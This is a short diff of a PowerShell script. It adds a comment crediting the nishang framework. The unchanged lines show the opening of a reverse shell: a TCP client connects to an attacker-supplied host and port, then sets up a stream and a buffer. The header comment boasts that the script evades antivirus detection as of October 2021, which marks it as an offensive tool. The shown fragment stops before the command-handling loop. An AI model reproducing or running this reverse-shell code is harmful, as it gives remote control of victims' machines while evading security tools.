@@ -1,4 +1,5 @@
 #Twitter: @TihanyiNorbert  (No AV detecetion 2021 october)
+#Based on the original nishang Framework written by @nikhil_mitt.
 $c = New-Object System.Net.Sockets.TCPClient($args[0],$args[1]);
 $I = $c.GetStream();
 [byte[]]$U = 0..(2-shl15)|%{0};
